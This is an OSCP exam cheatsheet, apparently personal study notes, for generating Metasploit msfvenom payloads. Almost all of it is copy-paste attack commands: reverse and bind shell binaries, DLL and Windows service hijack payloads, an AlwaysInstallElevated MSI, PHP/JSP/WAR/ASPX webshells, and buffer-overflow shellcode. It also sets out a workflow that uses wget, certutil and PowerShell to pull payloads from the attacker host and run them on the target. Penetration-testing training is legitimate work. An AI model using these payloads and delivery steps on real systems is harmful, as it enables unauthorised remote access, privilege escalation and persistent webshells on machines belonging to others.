# MSFvenom - OSCP Payload Generation Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Shells and Payloads Methodology: [[08-Shells-Payloads|08 - Shells and Payloads]]
> - Reverse Shells Cheatsheet: [[🐢 reverse-shells]]
> - Windows Privilege Escalation: [[04-Windows-PrivEsc|04 - Windows Privilege Escalation]]
> - Linux Privilege Escalation: [[03-Linux-PrivEsc|03 - Linux Privilege Escalation]]
> - File Transfer Methodology: [[07-File-Transfer|07 - File Transfer Methodology]]

---

## Navigation Triage Matrix

| Operational Goal | Payload Type / Platform | Quick Link |
|---|---|---|
| Master msfvenom CLI flags and parameters | CLI Syntax and Parameters | [[#1. Core Syntax and Parameter Guide]] |
| Distinguish staged vs stageless payloads | Staged vs Stageless Payloads | [[#2. Staged vs Stageless Architecture]] |
| Generate ELF executables and bind shells | Linux Payloads | [[#3. Linux Binary Payloads]] |
| Generate EXEs, DLLs, and service binaries | Windows Payloads | [[#4. Windows Binary Payloads]] |
| Payloads for AlwaysInstallElevated and services | Privilege Escalation Payloads | [[#5. Windows Privilege Escalation Payloads]] |
| Generate PHP, JSP, WAR, ASP, and ASPX webshells | Web Application Payloads | [[#6. Web Application Payloads]] |
| Generate Bash, Python, and PowerShell strings | Scripting Language Payloads | [[#7. Scripting Language Payloads]] |
| Generate C, Python, and raw BOF shellcode | Buffer Overflow Shellcode | [[#8. Buffer Overflow Shellcode (Bad Character Stripping)]] |
| Search payloads, formats, and encoders | Payload Discovery | [[#9. Payload and Format Discovery]] |
| Systematic generation, delivery, and catch process | Exam Delivery Workflow | [[#10. OSCP Payload Delivery Workflow]] |
| Quick copy-paste command cheat sheet | Quick Reference | [[#11. Quick Reference Cheat Sheet]] |

---

## 1. Core Syntax and Parameter Guide

`msfvenom` is Metasploit's standalone payload generation utility. It functions independently of the `msfconsole` framework and produces self-contained payloads compatible with standard Netcat listeners.

### Standard Invocation Format
```bash
msfvenom -p [PAYLOAD] LHOST=[KALI_IP] LPORT=[LPORT] -f [FORMAT] -o [OUTPUT_FILE]
```

### Essential Flag Reference

| Flag | Description | Typical Options |
|---|---|---|
| `-p` | Specific payload identifier | `windows/x64/shell_reverse_tcp` |
| `LHOST` | Attacker callback IP address | `[KALI_IP]` (interface `tun0`) |
| `LPORT` | Attacker callback listener port | `443`, `4444`, `80` |
| `-f` | Output format | `exe`, `elf`, `raw`, `c`, `py`, `war`, `aspx` |
| `-o` | Output file destination path | `shell.exe`, `shell.elf` |
| `-a` | Architecture | `x86`, `x64` |
| `--platform` | Target operating system platform | `windows`, `linux`, `java` |
| `-b` | Bad characters to exclude from shellcode | `-b "\x00\x0a\x0d"` |
| `-e` | Shellcode encoder | `x86/shikata_ga_nai`, `x64/zutto_dekiru` |
| `EXITFUNC` | Exit function technique (process stability) | `EXITFUNC=thread`, `EXITFUNC=process` |

---

## 2. Staged vs Stageless Architecture

Understanding payload naming syntax is vital for OSCP exam compliance and listener configuration:

### The Naming Rule
```text
windows/x64/shell_reverse_tcp   <-- STAGELESS (contains underscore '_')
                                     Entire shell payload bundled into binary.
                                     Works with standard Netcat listener (nc -lvnp).

windows/x64/shell/reverse_tcp   <-- STAGED (contains slash '/')
                                     Small stub connects back to retrieve stage 2.
                                     REQUIRES Metasploit multi/handler listener.
```

> ⚠️ **OffSec Exam Policy**:
> - **Metasploit Usage**: You may only use Metasploit (and Meterpreter) against **ONE** single machine across the entire OSCP exam.
> - **Stageless Advantage**: Non-Meterpreter stageless payloads (e.g., `shell_reverse_tcp`) caught with **Netcat** have **NO restrictions** and can be used across all lab and exam machines.

---

## 3. Linux Binary Payloads

### Linux x64 Reverse Shell (Stageless ELF)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f elf -o shell.elf
```
Target Execution:
```bash
chmod +x shell.elf && /tmp/shell.elf
```

### Linux x86 Reverse Shell (32-bit Legacy ELF)
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f elf -o shell32.elf
```

### Linux x64 Bind Shell
Spawns a shell listening on target port `[TARGET_PORT]`:
```bash
msfvenom -p linux/x64/shell_bind_tcp LPORT=[TARGET_PORT] -f elf -o bind.elf
```
Connection from Kali:
```bash
nc -nv [TARGET_IP] [TARGET_PORT]
```

---

## 4. Windows Binary Payloads

### Windows x64 Reverse Shell (Stageless EXE)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f exe -o shell.exe
```

### Windows x86 Reverse Shell (32-bit Legacy EXE)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f exe -o shell32.exe
```

### Windows x64 Staged Meterpreter (Metasploit Allowed Machine Only)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f exe -o meterpreter.exe
```
Metasploit Listener:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST [KALI_IP]; set LPORT [LPORT]; run"
```

### Windows Dynamic Link Library (DLL Hijacking)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f dll -o missing_lib.dll
```

### Windows Service Executable (Service Binary Hijacking)
When replacing an existing unquoted or writable Windows service executable:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f exe-service -o svc_shell.exe
```

---

## 5. Windows Privilege Escalation Payloads

### AlwaysInstallElevated (MSI Package)
When both `AlwaysInstallElevated` registry keys are enabled:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f msi -o install.msi
```
Target Execution (Silent, no GUI):
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\install.msi
```

### DLL Hijacking Payload (32-bit and 64-bit)
```bash
# 64-bit DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f dll -o hijacked.dll

# 32-bit DLL
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f dll -o hijacked.dll
```

---

## 6. Web Application Payloads

### PHP Webshell (Raw PHP Script)
```bash
msfvenom -p php/reverse_php LHOST=[KALI_IP] LPORT=[LPORT] -f raw -o shell.php
```

### JSP Webshell (Apache Tomcat and Java Servers)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f raw -o shell.jsp
```

### WAR Web Archive (Tomcat Manager Upload)
Deployable application archive for Tomcat `/manager/html`:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f war -o shell.war
```
*Trigger after upload*: Browse to `http://[TARGET_IP]:8080/shell/`

### ASP Payload (Classic IIS)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f asp -o shell.asp
```

### ASPX Payload (Modern IIS .NET Framework)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f aspx -o shell.aspx
```

---

## 7. Scripting Language Payloads

### Python Standalone Script
```bash
msfvenom -p cmd/unix/reverse_python LHOST=[KALI_IP] LPORT=[LPORT] -f raw -o shell.py
```

### Bash One-Liner Payload
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=[KALI_IP] LPORT=[LPORT] -f raw
```

### PowerShell Command Payload
```bash
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f raw
```

---

## 8. Buffer Overflow Shellcode (Bad Character Stripping)

When developing binary exploit proofs-of-concept for Buffer Overflow targets:

### C Format Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] \
  -f c -b "\x00\x0a\x0d" EXITFUNC=thread
```

### Python Format Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] \
  -f py -b "\x00\x0a\x0d" EXITFUNC=thread -v buf
```

### Raw Shellcode Binary
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] \
  -f raw -b "\x00\x0a\x0d" EXITFUNC=thread -o shellcode.bin
```

> 💡 **Stability Tips**:
> - `-b "\x00\x0a\x0d"` eliminates NULL bytes (`\x00`), line feeds (`\x0a`), and carriage returns (`\x0d`). Add any application-specific bad characters identified during fuzzing.
> - `EXITFUNC=thread` prevents the entire parent process (e.g., target service) from crashing when the reverse shell session closes.

---

## 9. Payload and Format Discovery

```bash
# List all available payloads
msfvenom -l payloads

# Search for specific OS payloads
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep windows

# Search for stageless shell payloads
msfvenom -l payloads | grep shell_reverse_tcp

# List all output formats
msfvenom -l formats

# List available shellcode encoders
msfvenom -l encoders
```

---

## 10. OSCP Payload Delivery Workflow

Follow this standardized operational sequence to stage, deliver, and execute payloads during exams:

```text
1. RECON TARGET ARCHITECTURE
   └── Verify OS (Windows vs Linux) and Architecture (x86 vs x64).

2. GENERATE STAGELESS PAYLOAD
   └── msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f exe -o shell.exe

3. STAGE LOCAL HTTP SERVER ON KALI
   └── python3 -m http.server 80   (Run in folder containing payload)

4. START NETCAT LISTENER ON KALI
   └── nc -lvnp 443

5. DOWNLOAD PAYLOAD ON TARGET
   └── Linux:   wget http://[KALI_IP]/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf
   └── Windows: certutil -urlcache -f http://[KALI_IP]/shell.exe C:\Windows\Temp\shell.exe
   └── Windows: powershell -c "iwr -Uri http://[KALI_IP]/shell.exe -OutFile C:\Windows\Temp\shell.exe"

6. TRIGGER EXECUTION
   └── Linux:   /tmp/shell.elf
   └── Windows: C:\Windows\Temp\shell.exe

7. STABILIZE CATCHED SHELL
   └── Upgrade raw Netcat to fully interactive TTY.
```

---

## 11. Quick Reference Cheat Sheet

```bash
# 1. Linux x64 Stageless ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f elf -o shell.elf

# 2. Windows x64 Stageless EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f exe -o shell.exe

# 3. Windows Service Binary (Service Hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f exe-service -o svc.exe

# 4. Windows MSI Installer (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f msi -o priv.msi

# 5. Windows DLL Hijacking
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f dll -o hijack.dll

# 6. PHP Reverse Shell
msfvenom -p php/reverse_php LHOST=[KALI_IP] LPORT=[LPORT] -f raw -o shell.php

# 7. Tomcat WAR Webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f war -o shell.war

# 8. IIS ASPX Webshell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f aspx -o shell.aspx

# 9. BOF Python Shellcode (Bad Chars Stripped)
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[LPORT] -f py -b "\x00\x0a\x0d" EXITFUNC=thread -v buf
```
